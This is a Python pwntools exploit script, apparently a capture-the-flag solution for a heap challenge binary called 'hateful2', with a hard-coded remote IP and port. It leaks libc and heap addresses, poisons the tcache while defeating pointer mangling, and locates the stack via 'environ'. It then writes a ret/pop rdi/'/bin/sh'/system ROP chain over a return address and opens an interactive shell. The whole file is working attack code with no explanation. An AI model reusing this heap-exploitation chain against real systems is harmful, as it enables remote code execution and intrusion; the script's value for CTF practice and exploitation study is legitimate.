#!/usr/bin/env python3

from pwn import *

exe = ELF("./hateful2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("52.59.124.14",5022)

    return r

def malloc(idx,sze,pl):
    r.sendlineafter(b'>>',b'1')
    r.sendlineafter(b':',str(idx).encode())
    r.sendlineafter(b':',str(sze).encode())
    r.recvuntil(b'>>')
    r.send(pl)
def edit(idx,pl):
    r.sendlineafter(b'>>',b'2')
    r.sendlineafter(b':',str(idx).encode())
    r.recvuntil(b'>>')
    r.send(pl)
def view(idx):
    r.sendlineafter(b'>>',b'3')
    r.sendlineafter(b':',str(idx).encode())
    r.recvuntil(b':')
    return r.recvline().strip()
def free(idx):
    r.sendlineafter(b'>>',b'4')
    r.sendlineafter(b':',str(idx).encode())

r = conn()
for i in range(9):
    malloc(i,0x98,b'a')
for i in range(9):
    free(8-i)
libc.address = unpack(view(0),'all') - 0x1d2cc0
heap_base = unpack(view(8),'all')<<12
print("heap base:",(hex(heap_base)))
print("libc base:",hex(libc.address))
print("libc argv:",hex(libc.sym['environ']))
env = libc.sym['environ']
malloc(1,0x38,b'a')
free(1)
edit(1,b'a'*16)
free(1)
tw = (env & ~(0xf)) ^((heap_base)>>12)
edit(1,p64(tw)+b'a')
malloc(1,0x38,p8(tw & 0xff))
malloc(2,0x38,p8(env & 0xff))

sl = (unpack(view(2),'all')<<8)-0x118
print(f"rip : {hex(sl)}")
pop_rdi = libc.address + 0x277e5
print(f"pop rdi: {hex(pop_rdi)}")
binsh = next(libc.search(b'/bin/sh'))
print(f"binsh address : {hex(binsh)}")
ret = libc.address+0x26e99
#write to rip
malloc(4,0x38,b'a')
free(4)
edit(4,b'a'*16)
free(4)
tw = (sl & ~(0xf))^((heap_base)>>12)
edit(4,p64(tw))
malloc(4,0x38,p8(tw & 0xff))
malloc(4,0x38,b'a'*8+p64(ret) + p64(pop_rdi)+p64(binsh)+p64(libc.sym.system))
r.sendlineafter(b'>>',b'5')
r.interactive()
